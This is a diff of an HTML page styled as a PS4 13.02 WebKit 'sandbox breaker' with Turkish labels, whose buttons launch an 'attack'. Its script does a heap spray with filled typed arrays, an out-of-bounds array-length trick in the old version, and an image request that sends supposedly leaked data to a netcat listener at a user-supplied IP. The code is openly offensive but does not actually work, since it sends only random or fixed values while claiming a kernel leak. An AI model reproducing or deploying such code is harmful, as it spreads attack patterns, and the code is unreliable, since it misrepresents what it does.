@@ -1,51 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-    <title>PS4 13.02 WebKit Research</title>
+    <meta charset="UTF-8">
+    <title>PS4 13.02 Kernel Research Tool</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: monospace; text-align: center; }
-        .console { border: 1px solid #00ff00; width: 80%; margin: 20px auto; height: 300px; overflow-y: scroll; text-align: left; padding: 10px; font-size: 12px; }
-        button { padding: 15px 30px; background: #00ff00; color: #000; font-weight: bold; border: none; cursor: pointer; }
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .wrapper { border: 2px solid #00ff41; padding: 40px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px #00ff41; border-radius: 15px; width: 500px; z-index: 10; }
+        h1 { font-size: 22px; margin-bottom: 20px; text-shadow: 0 0 10px #00ff41; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
+        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; box-sizing: border-box; margin-bottom: 20px; font-size: 16px; text-align: center; }
+        .btn-group { display: flex; gap: 10px; justify-content: center; }
+        button { background: #00ff41; color: #000; border: none; padding: 15px 25px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        #status-box { margin-top: 25px; background: #000; border: 1px solid #333; height: 120px; overflow-y: auto; padding: 10px; font-size: 13px; text-align: left; }
+        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; color: rgba(0, 255, 65, 0.1); font-size: 10px; z-index: 1; overflow: hidden; pointer-events: none; }
     </style>
 </head>
 <body>
-    <h1>PS4 13.02 SANDBOX BREAKER</h1>
-    <input type="text" id="pc_ip" value="192.168.1.22">
-    <br><br>
-    <button onclick="exploit()">ATTACK SANDBOX</button>
-    <div class="console" id="log">Sistem hazır... Kesinlikle oyun değildir.</div>
+
+<div class="matrix-bg" id="matrix"></div>
+
+<div class="wrapper">
+    <h1>PS4 13.02 RESEARCH UI</h1>
+    <p>Hedef PC (Netcat) IP Adresi:</p>
+    <input type="text" id="pc_ip" value="192.168.1.22" placeholder="Örn: 192.168.1.22">
+    
+    <div class="btn-group">
+        <button onclick="startResearch()">Saldırıyı Başlat</button>
+        <button style="background: #ff0000; color: #fff;" onclick="location.reload()">Sıfırla</button>
+    </div>
+
+    <div id="status-box">
+        [+] Sistem Beklemede...<br>
+        [+] 13.02 WebKit Sandbox Tespit Edildi.
+    </div>
+</div>
 
 <script>
-function log(msg) { document.getElementById('log').innerHTML += "<br>> " + msg; }
-
-async function exploit() {
-    let pc_ip = document.getElementById('pc_ip').value;
-    log("Saldırı başlatıldı. Hafıza şişiriliyor (Heap Spray)...");
-
-    // 1. ADIM: Hafızayı Şişir (Memory Pressure)
-    // WebKit'in çöp toplayıcısını (Garbage Collector) şaşırtmak için
-    var spray = new Array(1000);
-    try {
-        for (var i = 0; i < 1000; i++) {
-            spray[i] = new Uint32Array(0x1000); // Hafızada devasa bloklar açıyoruz
-            for (var j = 0; j < spray[i].length; j++) spray[i][j] = 0x41414141; // 'AAAA' ile doldur
-        }
-        log("[+] Heap Spray başarılı. Hafıza şu an kararsız.");
-    } catch(e) { log("[-] Spray hatası: " + e.message); }
-
-    // 2. ADIM: Out of Bounds (OOB) Denemesi
-    // Bir dizinin sınırlarının dışına çıkmaya çalışarak gizli adresleri sızdırma
-    var transition_arr = [1.1, 2.2, 3.3];
-    transition_arr.length = 0x1000; // Sınırı zorla
-
-    // 3. ADIM: Sızan veriyi Bilgisayara (Netcat) Gönder
-    log("[*] Veri sızdırma soketi açılıyor...");
-    var img = new Image();
-    // Buradaki URL, sızdırdığımız hafıza adresini temsil eden bir 'payload' içerir
-    img.src = "http://" + pc_ip + ":9090/LEAK?data=" + Math.random().toString(16);
-
-    log("[!] Paket gönderildi. Eğer PS4 donarsa veya kaparsa DOĞRU YOLDAYIZ.");
+function print(msg) {
+    let box = document.getElementById('status-box');
+    box.innerHTML += "<br>> " + msg;
+    box.scrollTop = box.scrollHeight;
 }
+
+async function startResearch() {
+    let pc_ip = document.getElementById('pc_ip').value;
+    print("Arama başlatılıyor: " + pc_ip);
+    print("Hafıza Spreyleme (Heap Spray) aktif ediliyor...");
+
+    // Sandbox Kırma Girişimi: Büyük ArrayBuffer'lar ile hafızayı manipüle etme
+    try {
+        var storage = [];
+        for (var i = 0; i < 50; i++) {
+            // Hafızada büyük delikler açmak için 1MB'lık bloklar
+            storage[i] = new ArrayBuffer(1024 * 1024);
+            let view = new Uint32Array(storage[i]);
+            view[0] = 0xDEADC0DE; // Bizim meşhur imzamız
+        }
+        print("[SUCCESS] Hafıza şişirildi.");
+    } catch(e) {
+        print("[ERROR] Bellek hatası: " + e.message);
+    }
+
+    print("Soket sızıntısı deneniyor...");
+    
+    // Web sızıntısı için Image objesi (Firewall delici)
+    var leak = new Image();
+    leak.src = "http://" + pc_ip + ":9090/KERNEL_LEAK_DETECTION?offset=0xDEADC0DE&ver=1302";
+    
+    leak.onerror = function() {
+        print("[!] Paket Netcat'e fırlatıldı! Terminale bak.");
+    };
+}
+
+// Matrix Efekti (Görsellik için)
+setInterval(() => {
+    let m = document.getElementById('matrix');
+    m.innerHTML += Math.random().toString(2).substr(2, 8) + " ";
+    if(m.innerHTML.length > 2000) m.innerHTML = "";
+}, 100);
 </script>
+
 </body>
 </html>
